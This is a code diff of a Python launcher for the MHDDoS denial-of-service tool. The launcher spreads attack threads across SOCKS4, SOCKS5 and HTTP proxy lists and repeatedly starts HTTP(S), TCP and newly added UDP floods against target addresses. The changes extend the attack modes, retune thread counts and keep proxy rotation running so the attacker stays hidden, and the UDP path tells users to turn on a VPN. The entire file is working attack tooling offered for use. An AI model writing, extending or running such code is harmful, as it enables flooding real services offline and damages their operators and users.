@@ -25,40 +25,55 @@ def calculate_threads(total_threads, total_targets):
     http_proxies = sum(1 for _ in open('files/proxies/http.txt'))
     total_proxies = s4_proxies + s5_proxies + http_proxies
     if not total_proxies:
-        raise RuntimeError('No proxies found. Check -proxy-timeout and -skip-proxy-init flags')
+        raise RuntimeError('No proxies found. Check --proxy-timeout and --skip-proxy-init flags')
 
     threads_per_proxy = total_threads / total_targets / total_proxies
-    s4_threads = str(int(s4_proxies * threads_per_proxy))
-    s5_threads = str(int(s5_proxies * threads_per_proxy))
-    http_threads = str(int(http_proxies * threads_per_proxy))
+    s4_threads = int(s4_proxies * threads_per_proxy)
+    s5_threads = int(s5_proxies * threads_per_proxy)
+    http_threads = int(http_proxies * threads_per_proxy)
     return s4_threads, s5_threads, http_threads
 
 
 def run_ddos(targets, total_threads, period, rpc, http_methods):
     os.chdir('MHDDoS')
 
-    period = str(period)
-    rpc = str(rpc)
-
     s4_threads, s5_threads, http_threads = calculate_threads(total_threads, len(targets))
     processes = []
     for target in targets:
-        for socks_type, socks_file, threads in (
-            ('4', 'socks4.txt', s4_threads),
-            ('5', 'socks5.txt', s5_threads),
-            ('1', 'http.txt', http_threads),
-        ):
-            if target.lower().startswith('tcp://'):
-                process = subprocess.Popen(
-                    ['python3', 'start.py', 'TCP', target[6:], threads, period, socks_type, socks_file]
-                )
-            else:
-                method = random.choice(http_methods)
-                process = subprocess.Popen(
-                    ['python3', 'start.py', method, target, socks_type, threads, socks_file, rpc, period]
-                )
-
+        # UDP
+        if target.lower().startswith('udp://'):
+            print(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
+            udp_threads = s4_threads + s5_threads + http_threads
+            process = subprocess.Popen([
+                'python3', 'start.py', 'UDP', target[6:], str(udp_threads), str(period)
+            ])
             processes.append(process)
+
+        # TCP
+        elif target.lower().startswith('tcp://'):
+            for socks_type, socks_file, threads in (
+                ('4', 'socks4.txt', s4_threads + http_threads // 2),
+                ('5', 'socks5.txt', s5_threads + http_threads // 2),
+            ):
+                process = subprocess.Popen([
+                    'python3', 'start.py', 'TCP', target[6:],
+                    str(threads), str(period), socks_type, socks_file
+                ])
+                processes.append(process)
+
+        # HTTP(S)
+        else:
+            for socks_type, socks_file, threads in (
+                ('4', 'socks4.txt', s4_threads),
+                ('5', 'socks5.txt', s5_threads),
+                ('1', 'http.txt', http_threads),
+            ):
+                method = random.choice(http_methods)
+                process = subprocess.Popen([
+                    'python3', 'start.py', method, target, socks_type,
+                    str(threads), socks_file, str(rpc), str(period),
+                ])
+                processes.append(process)
 
     for p in processes:
         p.wait()
@@ -66,12 +81,13 @@ def run_ddos(targets, total_threads, period, rpc, http_methods):
     os.chdir('../')
 
 
-def start(threads_per_core, period, targets, rpc, http_methods):
+def start(total_threads, period, targets, rpc, http_methods):
     shutil.copy('proxy_config.py', 'proxy-scraper-checker/config.py')
+    no_proxies = all(target.lower().startswith('udp://') for target in targets)
 
-    total_threads = threads_per_core * multiprocessing.cpu_count()
     while True:
-        update_proxies(period)
+        if not no_proxies:
+            update_proxies(period)
         run_ddos(targets, total_threads, period, rpc, http_methods)
 
 
@@ -86,8 +102,8 @@ def init_argparse() -> argparse.ArgumentParser:
         '-t',
         dest='threads',
         type=int,
-        default=100,
-        help='Number of threads per CPU core (default is 100)',
+        default=100 * multiprocessing.cpu_count(),
+        help='Total number of threads(default is 100 * CPU Cores)',
     )
     parser.add_argument(
         '-p',
